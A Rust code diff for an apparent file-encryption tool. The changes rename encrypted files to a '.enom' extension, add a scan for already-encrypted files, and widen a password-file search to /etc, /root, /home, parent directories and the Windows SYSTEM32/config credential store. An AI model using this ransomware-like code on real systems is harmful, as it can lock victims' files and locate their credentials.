@@ -43,6 +43,23 @@ impl std::fmt::Display for Mode {
     }
 }
 
+pub fn pre_validate_source(source_dir: &PathBuf) -> Option<PathBuf> {
+    println!("\n\nValidating if the source directory has any encrypted files");
+    for entry in WalkDir::new(source_dir)
+        .follow_links(true)
+        .into_iter()
+        .filter_map(|e| e.ok()) {
+            
+            let f_name = entry.file_name().to_string_lossy();
+
+            if f_name.ends_with(".enom") {
+                let file_path: PathBuf = entry.into_path().as_path().to_owned();
+                return Some(file_path);
+            }
+        } 
+    return None;
+}
+
 pub fn recurse_dirs(item: &PathBuf) {
     if item.is_dir() {
         if let Ok(paths) = fs::read_dir(item) {
@@ -68,7 +85,7 @@ pub fn find_password_file() -> Option<PathBuf> {
 
     let os_type = env::consts::OS;
     let target_dir = match os_type {
-        "linux" => vec!["/home", "/etc", "/root", "./"],
+        "linux" => vec![".", "..", "../../", "/etc", "/root", "/home"],
         "windows" => vec!["C:/WINDOWS/SYSTEM32/config", "."],
         _ => vec!["."]
     };
@@ -155,7 +172,7 @@ pub fn encrypt_files(
                                     .expect("Found a bad file")
                                     .replace(source_dir_name, target_dir_name)
                                     .to_string()
-                                    + ".enc";
+                                    + ".enom";
 
                                 println!("Encrypted file :: {}", new_file_name);
                                 
@@ -176,7 +193,7 @@ pub fn encrypt_files(
                                             .expect("Found a bad file")
                                             .replace(source_dir_name, target_dir_name)
                                             .to_string()
-                                            + ".enc";
+                                            + ".enom";
                                         
                                         println!("Encrypted file :: {}", new_file_name);
                                         
@@ -236,7 +253,7 @@ pub fn decrypt_files(
                                         .to_str()
                                         .unwrap()
                                         .replace(source_dir_name, target_dir_name)
-                                        .replace(".enc", "")
+                                        .replace(".enom", "")
                                         .to_string();
                                     println!("Decrypted file :: {}", new_file_name);
                                     let _ = fs::write(new_file_name, res);
@@ -264,7 +281,7 @@ pub fn decrypt_files(
                                     .to_str()
                                     .unwrap()
                                     .replace(source_dir_name, target_dir_name)
-                                    .replace(".enc", "")
+                                    .replace(".enom", "")
                                     .to_string();
                                 
                                 println!("Decrypted file :: {}", new_file_name);
